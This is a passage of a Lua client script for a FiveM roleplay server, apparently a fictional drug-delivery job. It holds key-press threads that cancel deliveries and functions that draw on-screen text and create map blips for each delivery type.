			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- CRACK
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and crackd then
			crjSleep = 1
			crackd = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- MACONHA
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and entregamaconha then
			crjSleep = 1
			entregamaconha = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- OPIO
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and entregaopio then
			crjSleep = 1
			entregaopio = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- META
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and entregameta then
			crjSleep = 1
			entregameta = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- PEÇAS
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and entregapecas then
			crjSleep = 1
			entregapecas = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- MAQUINA
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and pendrive then
			crjSleep = 1
			pendrive = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- LSD
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and entregalsd then
			crjSleep = 1
			entregalsd = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- MORFINA
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and entregamorfina then
			crjSleep = 1
			entregamorfina = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-- EXTASE
Citizen.CreateThread(function()
	while true do
		local PcrjSleep = 200
		if IsControlJustPressed(0,168) and entregaextase then
			crjSleep = 1
			entregaextase = false
			RemoveBlip(blip)
			break
		end
		Citizen.Wait(crjSleep)
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCOES
-----------------------------------------------------------------------------------------------------------------------------------------

function drawTxt(x,y,width,height,scale,text,r,g,b,a)
    SetTextFont(4)
    SetTextScale(scale,scale)
    SetTextColour(r,g,b,a)
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x,y)
end

function DrawText3Ds(x,y,z, text)
    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
    local px,py,pz=table.unpack(GetGameplayCamCoords())
    
    SetTextScale(0.35, 0.35)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(_x,_y)
    local factor = (string.len(text)) / 370
    DrawRect(_x,_y+0.0125, 0.015+ factor, 0.03, 41, 11, 41, 68)
end

function GetMinimapAnchor()
    local safezone = GetSafeZoneSize()
    local safezone_x = 1.0 / 20.0
    local safezone_y = 1.0 / 20.0
    local aspect_ratio = GetAspectRatio(0)
    local res_x, res_y = GetActiveScreenResolution()
    local xscale = 1.0 / res_x
    local yscale = 1.0 / res_y
    local Minimap = {}
    Minimap.width = xscale * (res_x / (4 * aspect_ratio))
    Minimap.height = yscale * (res_y / 5.674)
    Minimap.left_x = xscale * (res_x * (safezone_x * ((math.abs(safezone - 1.0)) * 10)))
    Minimap.bottom_y = 1.0 - yscale * (res_y * (safezone_y * ((math.abs(safezone - 1.0)) * 10)))
    Minimap.right_x = Minimap.left_x + Minimap.width
    Minimap.top_y = Minimap.bottom_y - Minimap.height
    Minimap.x = Minimap.left_x
    Minimap.y = Minimap.top_y
    Minimap.xunit = xscale
    Minimap.yunit = yscale
    return Minimap
end

function CriandoBlip(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega Cocaina")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip2(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega Crack")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip3(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega Maconha")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip4(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega OPIO")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip5(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega de Metanfetamina")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip6(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega de Pecas")
	EndTextCommandSetBlipName(blip)
end


function CriandoBlip9(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Pen Drive")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip10(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega de LSD")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip11(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,433)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega de Cocaina")
	EndTextCommandSetBlipName(blip)
end

function CriandoBlip12(entregas,destino)
	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
	SetBlipSprite(blip,1)
	SetBlipColour(blip,5)
	SetBlipScale(blip,0.7)
	SetBlipAsShortRange(blip,false)
	SetBlipRoute(blip,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega de Extase")
	EndTextCommandSetBlipName(blip)
end